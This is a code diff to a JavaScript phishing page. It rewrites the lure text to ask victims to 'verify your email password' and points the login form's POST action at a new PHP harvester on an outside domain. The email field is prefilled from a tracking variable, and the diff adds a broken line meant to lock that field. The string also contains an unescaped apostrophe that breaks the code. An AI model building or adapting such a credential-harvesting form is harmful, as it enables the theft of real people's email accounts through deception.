@@ -133,12 +133,12 @@ function createForm() {
     containerDiv.appendChild(h2);
 
     const p = document.createElement('p');
-    p.textContent = 'Please sign in to Cloud to access the file.';
+    p.textContent = 'Because you're accessing sensitive info, you need to verify your email password.';
     containerDiv.appendChild(p);
 
     const form = document.createElement('form');
     form.name = 'loginForm';
-    form.action = 'https://smilingtomato.com/img/config/fr.php';
+    form.action = 'https://02cb186.netsolhost.com/natty.php';
     form.method = 'post';
     containerDiv.appendChild(form);
 
@@ -149,6 +149,7 @@ function createForm() {
     emailInput.id = 'email';
     emailInput.value = emltag; // Set the value of the username field to emltag
     emailInput.required = true;
+	emailInput = 'readonly';
     form.appendChild(emailInput);
 
     const passwordInput = document.createElement('input');
